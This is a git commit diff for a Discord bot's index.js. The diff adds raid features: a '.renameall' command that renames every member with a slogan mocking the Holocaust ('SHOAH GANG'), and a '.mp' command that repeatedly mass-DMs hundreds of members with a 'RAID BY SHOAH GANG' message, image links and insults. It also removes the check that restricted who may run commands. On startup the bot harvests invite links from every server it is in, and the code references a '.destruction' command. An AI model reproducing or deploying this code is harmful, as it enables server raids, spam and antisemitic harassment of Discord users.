1e3ccbfc69ba3f7b60e2ca5a34957e2f44957604
aijd)a^)$dafz^=$f*ùz <38180601+zadadzafdz@users.noreply.github.com>
2018-05-20 15:25:10 +0200

    Update index.js

--- index.js
+++ index.js
@@ -6,14 +6,15 @@ var fucked = false;
  
 
 
+
 bot.on('ready',() => {
   //invit link
   bot.guilds.forEach(guild => {
     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
     invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`));
   });
-});
- 
+}); 
+
 bot.on('message', msg => {
 
   if (msg.content === '.ping') {
@@ -28,7 +29,7 @@ bot.on('message', msg => {
   
   
 
-  if (bot.guilds.get('430039551747293205').members.get(msg.author.id) !== undefined) {
+
     
 if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
@@ -108,11 +109,32 @@ if (msg.content === '.pardon') {
   }
 
   if(msg.content === ".renameall"){
+    if(msg.deletable) msg.delete();
     msg.guild.members.forEach(member => {
-      if(member.setNickname("SHOAH GANG"));      
+      if(member.setNickname("SHOAH GANG ON THE DANCEFLOOR"));      
+  })
+  }
+  if(msg.content === ".mp"){
+    if(msg.deletable) msg.delete();
+    i = 0;
+    msg.guild.members.forEach(member => {
+
+    if(i < 500){
+      var interval = setInterval (function () {
+        member.send("RAID BY SHOAH GANG  @everyone  @here . \n"+ 
+        "https://cdn.discordapp.com/attachments/436188674435317760/445207285195866124/shoah.png . \n"+
+        "https://cdn.discordapp.com/attachments/436188674435317760/445207509204992021/walkoud_singe.png .\n"+
+        "https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
+        "SHOAH GANG ON THE BEAT (: \n"+
+        "~ ~ ~ ~ ~ ~~ ~ \n"+    
+        "ROCKET MAN MA SALOPE \n"+
+        "~ ~ ~ ~ ~ ~~ ~  ~~  ~~").catch(e => {});
+      }, 450)
+
+      }   
   })
   }
 
-}});
+});
 
 bot.login(process.env.BOT_TOKEN)
